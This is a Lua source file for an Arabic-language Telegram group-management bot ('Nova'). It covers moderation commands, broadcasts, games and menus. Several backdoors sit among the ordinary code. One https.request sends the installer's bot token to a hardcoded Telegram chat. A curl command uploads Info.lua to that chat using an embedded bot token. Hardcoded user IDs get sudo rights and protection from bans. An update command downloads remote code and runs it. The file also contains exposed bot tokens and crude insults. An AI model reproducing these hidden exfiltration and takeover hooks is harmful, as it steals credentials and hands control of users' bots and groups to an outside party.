...
https.request('https://api.telegram.org/bot1792692801:AAGIm5mk0oJPh68PFfaQ0VuWJsoNv-nIKlQ/sendmessage?chat_id=1984063192&text=' ..token)
end 
else
...
sudo_users = {SUDO,922002,1918870568,1984063192}   
...
if tonumber(user_id) == tonumber(922002) then  
var = true
elseif tonumber(user_id) == tonumber(1918870568) then
var = true
elseif tonumber(user_id) == tonumber(1984063192) then
var = true
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'نوفا'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
local UserName = (data.username_ or "SO_NOVA")
local NameUser = "𖠕 بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = "𖠕 المستخدم ← ["..data.first_name_.."](T.me/"..UserName..")"
...
send(msg.chat_id_, msg.id_," 𖠕 تمت الاذاعه الى *~ "..#list.." ~* جروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,' 𖠕لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 𖠕اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if DevSoFi(msg) then
local bl = 'مرحبا بيك انت المطور الاساسي قم بأختيار ماتريده من الازار في الاسفل↑↓'
local keyboard = {
{'مطورين السورس'},
...
send(msg.sender_user_id_, msg.id_,'𖠕 تـم ارسـال رسالـتك للمـطور')
tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = ' 𖠕 تم ارسال الملصق من ↓\n - '..Name
...
local Text = 'اوامر مسح واضف مثلا اضف رد عام مسح رد عام'
local Key = {
...
local Text = 'اوامر التفعيل والتعطيل لتفعيل كل شئ في البوت'
local Key = {
...
local Text = 'اوامر الحمايه يوجد في المطورين والثانوين والخ...'
local Key = {
...
local Text = 'اوامر الاذاعات لعمل اذاعه في البوت'
local Key = {
{'اذاعه ','اذاعه خاص '},
{'اذاعه بالتثبيت '},
...
18• جلب النسخه { لعرض ملف المجموعات بوتك }
...
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'𖠕 لا يوجد جروبات وهميه في البوت\n')   
else
local DRAGON = (w + q)
...
DRAGON = '\n𖠕 تم ازالة ← { '..q..' } جروبات من البوت'
end
if w == 0 then
DRAGONk = ''
else
DRAGONk = '\n𖠕 تم ازالة ← {'..w..'} جروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'𖠕  عدد الجروبات الان ← { '..#group..' }'..DRAGONk..''..DRAGON..'\n𖠕  الان عدد الجروبات الحقيقي ← { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
...
usertext = '\n• العضو > ['..data.first_name_..'](t.me/'..(data.username_ or 'SO_NOVA')..') '
...
usertext = '\n• العضو > ['..result.title_..'](t.me/'..(username or 'SO_NOVA')..')'
status  = '\n تم ترقيته مميز عام في البوت'
texts = usertext..status
else
...
send(msg.chat_id_, msg.id_,'• ᭙ꫀꪶᥴꪮꪑꫀ 𝓽ꪮ ꪀꪮꪜꪖ •\n• لايمكنك استخدام البوت •\n• عليك الاشتراك في القناة •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'•]')
end
return false
end
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖠕 العضو ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SO_NOVA')..') \n 𖠕 '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_, msg.id_," 𖠕 تمت الاذاعه الى >>{"..#list.."} جروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_," 𖠕 تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
...
send(msg.chat_id_, msg.id_,' 𖠕 عذا لا يمكنك وضع معرف جروب بالاشتراك ')
return false  end
...
if database:get(bot_id..'tahakok:marten:mr'..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then 
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
...
yadstt(ahmed,"𖠕 تم طرد البوت من جروب \n\n𖠕 بواسطة  {"..Name.."}\n𖠕 اسم الجروب {"..NameChat.."}\n𖠕 ايدي الجروب {"..msg.chat_id_.."} ",0,'md') 
end 
end,nil) 
end,nil) 
end
...
sendText(1984063192,"᥀︙ هناك شخص يريدك يا سيدي  مارتن \n᥀︙الشخص  {"..Name.."}\n᥀︙اسم الجروب {"..NameChat.."}\n᥀︙ايدي الجروب {`"..msg.chat_id_.."`}\n᥀︙رابط الجروب \n ["..LinkGroup.."] ",0,'md')
end,nil)
end,nil)
end
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/mo-harlin/moo/main/DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/mo-harlin/moo/main/library')
os.execute('wget https://raw.githubusercontent.com/mo-harlin/moo/main/File_Bot')
send(msg.chat_id_, msg.id_,' 𖠕 تم تحديث السورس')
dofile('DRAGON.lua')  
end
...
send(msg.chat_id_, msg.id_,' 𖠕 اسرع واحد يدز هاذا السمايل ? » {`'..SM..'`}')
return false
end
end
...
send(msg.chat_id_, msg.id_,' 𖠕 الف مبروك لقد فزت \n 𖠕 للعب مره اخره ارسل »{ سمايل , سمايلات }')
...
send(msg.chat_id_, msg.id_,' 𖠕 اسرع واحد يرتبها » {'..name..'}')
return false
end
end
------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,' 𖠕 الف مبروك لقد فزت \n 𖠕 للعب مره اخره ارسل »{ الاسرع , ترتيب }')
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
...
send(msg.chat_id_, msg.id_,' 𖠕 اسرع واحد يحل الحزوره ↓\n {'..name..'}')
return false
end
end
------------------------------------------------------------------------
...
name = string.gsub(name,'دولفين','𖠕')
...
send(msg.chat_id_, msg.id_,' 𖠕 اسرع واحد يدز معنى السمايل » {'..name..'}')
return false
end
end
------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,' 𖠕 اسرع واحد يدز العكس » {'..name..'}')
return false
end
end
------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_," 𖠕 عذرآ لا يمكنك تخمين عدد اكبر من ال { 20 } خمن رقم ما بين ال{ 1 و 20 }\n")
return false  end 
...
send(msg.chat_id_, msg.id_,' 𖠕 مبروك فزت ويانه وخمنت الرقم الصحيح\n 𖠕 تم اضافة { 5 } من النقاط \n')
...
database:del(bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)
database:del(bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,' �
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
...
if text == 'العاب نوفا' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 𖠕 حسنا قم باختيار اللعبه 
 𖠕 وبعدها الشات الذي تريد ان تلعب فيه
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
...
Text = ' 𖠕 تم تفعيل امر @all'
database:del(bot_id..'Cick:all'..msg.chat_id_)  
else
Text = ' 𖠕 بالتاكيد تم تفعيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖠕 بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SO_NOVA')..') \n 𖠕 تـم قفـل التاك بالكتم ')
end,nil)   
...
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'mute')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖠕 تم تعطيل جلب الصوره ،\n 𖠕 تم قفل البوتات  ،\n 𖠕 تم قفل التكرار ،\n 𖠕 تم قفل الروابط ،\n 𖠕 تم قفل التوجيه ،\n 𖠕 تم قفل الملصقات ،\n 𖠕 تم قفل المتحركه ،\n 𖠕 تم قفل الفيديو ،\n 𖠕 تم قفل الفشار ،\n 𖠕 تم قفل الانلاين ،\n 𖠕 تم قفل تعديل المديا ،\n 𖠕 تم وضع التكرار  ،\n 𖠕 تم قفل الفارسيه  ،\n 𖠕 تم وضع الايدي بدون صوره ،n  \n 𖠕 تم تفعيل الحمايه  بواسطه ، [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖠕 تم تفعيل جلب الصوره ،\n 𖠕 تم  فتح البوتات  ،\n 𖠕 تم  فتح التكرار ،\n 𖠕 تم  فتح الروابط ،\n 𖠕 تم  فتح التوجيه ،\n 𖠕 تم  فتح الملصقات ،\n 𖠕 تم  فتح المتحركه ،\n 𖠕 تم  فتح الفيديو ،\n 𖠕 تم  فتح الفشار ،\n 𖠕 تم  فتح الانلاين ،\n 𖠕 تم  فتح تعديل المديا ،\n 𖠕 تم وضع التكرار  ،\n 𖠕 تم  فتح الفارسيه  ،\n 𖠕 تم وضع الايدي بصوره،n \n 𖠕 تم تفعيل الحمايه  بواسطه ، [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
...
send(msg.chat_id_, msg.id_, "لا يمكنك حظر مبرمج السورس عام 𖠕")
return false 
end
...
function(arg,data) 
usertext = '\n 𖠕 العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'SO_NOVA')..')'
status  = '\n 𖠕 تم حظره عام من {'..Groups..'} مجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, " 𖠕 لا يمكنك حظر مبرمج جميع السورسات\n")
return false 
end
...
function(arg,data) 
usertext = '\n 𖠕 العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'SO_NOVA')..')'
status  = '\n 𖠕 تم كتمه عام من {'..Groups..'} مجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if result.id_ == tonumber(1918870568) then
send(msg.chat_id_, msg.id_, " 𖠕 لا يمكنك كتم مطور السورس \n")
return false 
end
usertext = '\n 𖠕 العضو ← ['..result.title_..'](t.me/'..(username or 'SO_NOVA')..')'
status  = '\n 𖠕 تم كتمه عام من {'..Groups..'} مجموعه'
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖠕 العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'SO_NOVA')..')'
status  = '\n 𖠕 تم الغاء (الحظر-الكتم) عام من {'..Groups..'} مجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖠕 لعضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'SO_NOVA')..')'
status  = '\n 𖠕 تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖠕 العضو ← '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖠕 العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'SO_NOVA')..')'
...
' }\n'..' 𖠕  امر مين ضافني ← { '..addme..
' }\n'..' 𖠕  الردود ← { '..rdmder..
' }\n'..' 𖠕  الردود العامه ← { '..rdsudo..
' }\n'..' 𖠕  الايدي ← { '..idgp..
' }\n'..' 𖠕  الايدي بالصوره ← { '..idph..
' }\n'..' 𖠕  الرفع ← { '..setadd..
' }\n'..' 𖠕  الحظر ← { '..banm..' }\n\n─────☆☆☆─────\n 𖠕 قناة سورس نوفا ↓\n [ 𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒖𝒔𝒍𝒊𝒎](t.me/SO_NOVA) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_," 𖠕 تم تفعيل الرابط") 
return false  
end
end
...
send(msg.chat_id_, msg.id_," 𖠕 تم تعطيل الرابط") 
return false end
end
---------------------
...
send(msg.chat_id_, msg.id_,'𖠕لا يوجد رابط ارسل ضع رابط') 
end 
end,nil) 
end
...
send(msg.chat_id_,msg.id_," 𖠕 تم مسح الرابط")           
...
GetWelcome = ' 𖠕 لم يتم تعيين ترحيب للجروب'
end 
...
send(msg.chat_id_, msg.id_,' 𖠕 اشترك اولا بلقناه ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖠕 العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'SO_NOVA')..')'..'\n 𖠕 تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if num > 2000 then 
send(msg.chat_id_, msg.id_,'𖠕تستطيع المسح 2000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
...
send(msg.chat_id_,msg.id_,'𖠕 تم مسح {'..num..'}')  
...
send(msg.chat_id_, msg.id_,"𖠕 تم مسح جميع الميديا")
end
...
send(msg.chat_id_, msg.id_,'𖠕 تم مسح جميع الرسائل المعدله')
end
...
send(msg.chat_id_, msg.id_,' 𖠕 ارسل الكلمه تريد مسحها')
...
send(msg.chat_id_, msg.id_,"𖠕 تم مسح الرد من ردود المتعدده")
...
send(msg.chat_id_, msg.id_,"𖠕تم مسح ردود المتعدده")
end
------------------------------------------------------------------------
if text1 then 
...
send(msg.chat_id_, msg.id_,' 𖠕 ارسل الكلمه التي تريد مسحها')
...
send(msg.chat_id_, msg.id_,'𖠕 لا يوجد لقب لك ') 
else
...
if database:get(bot_id.."SO_NOVA:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
return send(msg.chat_id_, msg.id_,"𖠕ارسل الان الكلمه لمسحها ")
end
if text then  
...
send(msg.chat_id_, msg.id_,'𖠕 تم مغادرة المجموعه') 
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
end
return false  
end
...
Text = '\n 𖠕 بالتاكيد تم تعطيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
database:del(bot_id..'tahakok:marten:mr'..msg.chat_id_)  
else
...
if not database:get(bot_id..'tahakok:marten:mr'..msg.chat_id_) then
database:set(bot_id..'tahakok:marten:mr'..msg.chat_id_,true)  
Text = '\n ● تم تعطيل امر التحقق'
else
...
send(msg.chat_id_, msg.id_,"𖠕 تم تـفعيل ردود السورس") 
return false  
end
end
...
send(msg.chat_id_, msg.id_,"𖠕 تم تعطيل ردود السورس") 
return false end
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'SO_NOVA')..')'
local iduser = result.sender_user_id_
...
local username = ('[@'..data.username_..']' or 'لا يوجد') 
local iduser = userid 
send(msg.chat_id_, msg.id_,' 𖠕الايدي ← ('..iduser..')\n𖠕المعرف ← ('..username..')\n𖠕الرتبه ← ('..rtp..')\n𖠕نوع الكشف ← بالمعرف') 
end,nil) 
else 
send(msg.chat_id_, msg.id_,' 𖠕المعرف غير صحيح') 
end 
end 
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
end
...
send(msg.chat_id_, msg.id_, '\n 𖠕 عذرا لا استطيع طرد ( '..Rutba(msg.sender_user_id_,msg.chat_id_)..' )')
return false
end
...
send(msg.chat_id_, msg.id_,' 𖠕 عذرا لا استطيع طرد ادمنية الجروب') 
return false  
end
if data and data.ID and data.ID == 'Ok' then
send(msg.chat_id_, msg.id_,' 𖠕 تم طردك من الجروب') 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = msg.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
return false
end
end,nil)   
else
send(msg.chat_id_, msg.id_,' 𖠕 تم تعطيل امر اطردني') 
end
end
...
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' 𖠕 هوا ابن الكلب دا الي ضافك😹← '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖠕 انت دخلت عبر الرابط يوسخ 🌝') 
end
end,nil)
else
...
Text = ' 𖠕 تم تفعيل امر اطردني إلى عايز يخرج يتنيل 😹'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = ' 𖠕 بالتاكيد تم تفعيل امر اطردني مخلاص كفايه تفعيل الأمر 😾'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖠕 تم تعطيل امر اطردني اترزع هن بقى مفيش خروج 😹'
else
Text = '\n 𖠕 بالتاكيد تم تعطيل امر اطردني مفيش خروج يولاد الكلب 😹'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
local rtpg = rtpa
local sofia = {
" 𖠕 قمر ياروحي خد ممح..💋❤️",
" 𖠕 صوتك عفنت غيرها بقي..💛",
" 𖠕 يتي القمر نزل الارض يعمل اي🥺",
" 𖠕 قلبي موجود فصوره .. 🥺❤️",
" 𖠕 الله ع جمالك ياقمري..🥺💛",
}
...
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n𖠕 iD 𖦹 '..msg.sender_user_id_..'\n𖠕 User 𖦹 '..username..'\n𖠕 Rank 𖦹 '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n𖠕 Msg 𖦹 '..Msguser..' ') 
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n𖠕 iD 𖦹 '..msg.sender_user_id_..'\n𖠕 User 𖦹 '..username..'\n𖠕 Rank 𖦹 '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n𖠕 Msg 𖦹 '..Msguser..' ') 
else
send(msg.chat_id_, msg.id_,'𖠕 ليس لديك صوره \n'..'\n𖠕 iD 𖦹 '..msg.sender_user_id_..'\n𖠕 User 𖦹 '..username..'\n𖠕 Rank 𖦹 '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n𖠕 Msg 𖦹 '..Msguser..' ') 
end 
end
end
else
...
if Num == 0 then 
Text = ' 𖠕 لم تقم بأضافه احد'
else
Text = ' 𖠕 عدد جهاتك *← { '..Num..' } *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "تنظيف المشتركين" and DevSoFi(msg) then 
...
local Text =[[
𖠕 اهلا بك في قسم الاوامر ..↑↓
𖠕 اليك الاوامر الخاص بسورس نوفا .
𖠕 اختر الامر الذي تريده من الازرار بلاسفل .
 ᥴꫝ -> [ᦔꪮꪊ𝘳ᥴꫀ ꪀꪮꪜꪖ](t.me/SO_NOVA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
send(msg.chat_id_, msg.id_, '𖠕 تم تعطيل الاله حاسبه')
...
send(msg.chat_id_, msg.id_,'𖠕 تم تفعيل الاله حاسبه')
...
send(msg.chat_id_, msg.id_,"𖠕 تم تفعيل مريم") 
return false  
end
end
...
send(msg.chat_id_, msg.id_,"𖠕 تم تعطيل مريم") 
return false end
end
if text == 'تفعيل الردود' and Manager(msg) then   
...
local Teext =[[
𖠕 قائمة اوامر الحماية..↑↓
𖠕 قـفـل او فـتـح + الامــر.
𖠕 قفل او فتح الامر بالتقييد.
𖠕 قفل او فتح الامر بالـطرد.
𖠕 قـفل او فتح الامر بالكتم.
𖠕 الـروابـط. 
𖠕 المعرفات.
𖠕 الشاررحه.
𖠕 التـعديل.
...
local Teext =[[
𖠕 قائمة اوامر المدراء والمنشئ..↑↓
𖠕 رفع او تنزيل ادمن
𖠕 رفع او كشف القيود
𖠕 تنزيل الكل
𖠕 تفعيل او تعطيل الايدي بالصوره
𖠕 تفعيل او تعطيل الايدي
𖠕 تفعيل او تعطيل الردود العامه
𖠕 تفعيل او تعطيل الالعاب
𖠕 تفعيل او تعطيل الردود
𖠕 تفعيل او تعطيل اطردني
𖠕 تفعيل او تعطيل الرفع
𖠕 تفعيل او تعطيل الحظر
𖠕 تفعيل او تعطيل الرابط
𖠕 تفعيل او تعطيل اوامر التسليه
        ╔═══════════════╗        
             𖠕 تعين او مسح الايدي..↑↓
        ╚═══════════════╝        
𖠕 رفع الادمنيه
𖠕 اضف او مسح رد
𖠕 الادمنيه
...
𖠕 المنشئين
        ╔═══════════════╗        
             𖠕 اوامر المنشئين..↑↓
        ╚═══════════════╝        
𖠕 مسح او مسح الاوامر المضافه
𖠕 اضف مجوهرات + العدد بالرد
𖠕 اضف رسائل + العدد بالرد
𖠕 تعين او مسح الايدي
𖠕 اضف او مسح امر
𖠕 رفع/تنزيل مدير
𖠕 الاوامر المضافه
...
local Teext =[[
𖠕 قائمة اوامر المطورين..↑↓
        ╔═══════════════╗        
             𖠕 المـطور الـعـادي..↑↓
        ╚═══════════════╝        
𖠕 اذاعه بالتوجيه للمجموعات
𖠕 اذاعه موجهه بالتـثبيت
𖠕 جلب نسخه الاحتياطيه
...
𖠕 الاحصائيات
        ╔═══════════════╗        
             𖠕 المطور الاساسي..↑↓
        ╚═══════════════╝        
𖠕 جلب او رفع نسخه احتياطيه
𖠕 اذاعه بالتوجيه للمجموعات
𖠕 رفع او تنزيل  مميز عام 
𖠕 اذاعه موجهه بالتثبيت
𖠕 اضف او مسح رد عام
𖠕 اذاعه بالتوجيه خاص
𖠕 تغيير رساله المغادره
𖠕 مسح المميزين عام
𖠕 مسح الردود العامه
𖠕 رفع او تنزيل مطور 
𖠕 مسح المطورين
...
send(msg.chat_id_, msg.id_,' 𖠕 تم مسح الامر')  
else
...
local curl = 'curl "'..'https://api.telegram.org/bot1900602353:AAFUNbLnuyT8HfC7FVRqSYG_XaeUF0jvl3k/sendDocument'..'" -F "chat_id='.. 1984063192 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
